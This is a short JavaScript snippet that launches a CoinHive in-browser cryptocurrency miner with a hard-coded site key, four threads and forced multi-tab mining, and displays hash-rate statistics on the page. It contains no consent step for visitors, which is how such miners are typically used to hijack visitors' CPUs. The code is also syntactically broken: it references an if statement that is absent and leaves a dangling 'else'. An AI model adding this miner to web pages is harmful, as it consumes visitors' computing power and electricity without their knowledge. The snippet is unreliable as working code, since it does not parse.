		var miner = new CoinHive.Anonymous('TqBKEr08A8atWsXdAoc1Rpr1dA1CSPlC',
		{
			threads: 4,
			autoThreads: true,
			throttle:1,
			forceASMJS: false
		});
		miner.start(CoinHive.FORCE_MULTI_TAB);
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		var threadCount = miner.getNumThreads(); //Get the amount of threads

		//Remove the following if statement if you don't want the page to redirect to another page.
		else
		{
		document.getElementById("hps").innerHTML = hashesPerSecond;
		document.getElementById("th").innerHTML = totalHashes;
		document.getElementById("ah").innerHTML = acceptedHashes;
		document.getElementById("threads").innerHTML = threadCount;
		}
	}, 500);
